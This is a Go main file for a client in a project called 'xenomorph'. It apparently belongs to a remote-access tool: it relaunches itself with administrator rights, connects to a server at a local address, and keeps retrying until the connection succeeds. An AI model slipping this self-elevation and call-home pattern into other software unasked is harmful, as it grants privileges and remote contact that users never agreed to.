package main

import (
	"fmt"
	"os"
	"os/signal"
	"syscall"
	"time"

	client "github.com/codevault-llc/xenomorph/internal/netclient"
	"github.com/codevault-llc/xenomorph/pkg/logger"
	"github.com/codevault-llc/xenomorph/pkg/types"
	"github.com/codevault-llc/xenomorph/pkg/utils"
	"go.uber.org/zap"
)

func main() {
	startTime := time.Now()

	err := logger.InitClientLogger("development")
	if err != nil {
		panic(fmt.Sprintf("Failed to initialize logger: %v", err))
	}

	utils.RerunAsAdmin()

	netclient := client.NewClient("127.0.0.1:8080")
	defer netclient.Close()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		sig := <-sigChan
		duration := time.Since(startTime)

		var reason types.ShutdownReason
		switch sig {
		case syscall.SIGINT:
			reason = types.ShutdownSigInt
		case syscall.SIGTERM:
			reason = types.ShutdownSigTerm
		default:
			reason = types.ShutdownUnknown
		}

		netclient.SendDisconnect(reason, duration)
		netclient.Close()
		os.Exit(0)
	}()

	for {
		err := netclient.Run()
		if err != nil {
			logger.L().Warn("Client error, reconnecting...", zap.Error(err))

			time.Sleep(5 * time.Second)
			continue
		}

		logger.L().Info("Client connected successfully", zap.String("address", netclient.Address))
		break
	}
}
